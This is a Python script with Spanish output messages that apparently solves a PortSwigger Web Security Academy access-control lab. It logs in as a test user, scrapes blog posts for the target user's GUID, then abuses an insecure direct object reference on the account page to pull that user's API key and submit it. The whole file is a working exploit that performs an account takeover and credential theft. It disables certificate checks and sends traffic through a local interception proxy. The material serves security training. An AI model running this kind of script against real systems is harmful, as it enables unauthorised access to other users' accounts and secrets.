import requests
import sys
import urllib3
from bs4 import BeautifulSoup
import re

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies_setting = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}



def get_user_guid(session, base_url):
    
    response = session.get(base_url, verify=False, proxies=proxies_setting)
    find_postid = re.findall(r'postId=(\d+)', response.text)
    id = list(set(find_postid))
    #print(list_postid)
    
    for i in id:
        url_postid = f"{base_url}/post?postId={i}"
        response = session.get(url_postid, verify=False, proxies=proxies_setting)
        if "carlos" in response.text:
            find_guid = re.findall(r'userId=([^\']+)', response.text)
            if find_guid:
                guid = find_guid[0]
                print(f"[+] User carlos encontrado, GUID: {guid}")
                return guid
        else:
            print("[-] No encontro el usuario carlos")

def login_id(session, base_url, guid):
    
    url_id = f"{base_url}/my-account?id={guid}"
    response = session.get(url_id,verify=False, proxies=proxies_setting)
    if "Your username is: carlos" in response.text:
        print("(+) Login exitoso con user carlos")
        search_api_key = re.findall(r'Your API Key is: ([^<^]+)',response.text)
        if search_api_key:
            api_key = search_api_key[0]
            print(f"La api_key del usuario carlos es: {api_key}")
            return api_key
    else:
        print("(-) Login fallido con el id de carlos")
        
def submit_answer(session, base_url, pi_key_value):
    
    url_submitsolution = f"{base_url}/submitSolution"
    data = {'answer': pi_key_value}
    response = session.post(url_submitsolution, data=data, verify=False, proxies=proxies_setting)
    if "true" in response.text:
        print("[+] Laboratorio resuelto")
    else:
        print("[-] error al ingresar el guid")
    
def get_csrf_token(session, login_url):
    """Extraigo el CSRF token"""
    response = session.get(login_url, verify=False, proxies=proxies_setting)
    soup = BeautifulSoup(response.text, 'html.parser')
    csrf_token = soup.find('input', {'name': 'csrf'})['value']
    #print(csrf_token)
    return csrf_token

def api_key(session, base_url):
    """Login user wiener"""
    login_url = f"{base_url}/login"
    csrf_token = get_csrf_token(session, login_url)
    credential = {
        'csrf': csrf_token,
        'username': 'wiener',
        'password': 'peter'
    }
    response = session.post(login_url, data=credential, verify=False, proxies=proxies_setting)
    if "Log out" in response.text:
        print("[+] Login exitoso")
        return True
    else:
        print("[-] Login fallido")
        return False
    

    
def main():
    if len(sys.argv) !=2:
        print(f"[+] Uso: {sys.argv[0]} <url>")
        print(f"[+] Ejemplo: {sys.argv[0]} www.ejemplo.com")
        exit(-1)
    
    session = requests.session()
    base_url = sys.argv[1]
    login_session = api_key(session, base_url)
    
    if login_session:
        guid = get_user_guid(session, base_url)
        
        if guid:
            api_key_value = login_id(session, base_url, guid)
            
            if api_key_value:
                submit_answer(session, base_url, api_key_value)
                    
            else:
                print("Login con GUID fallido.")

if __name__ == "__main__":
    main()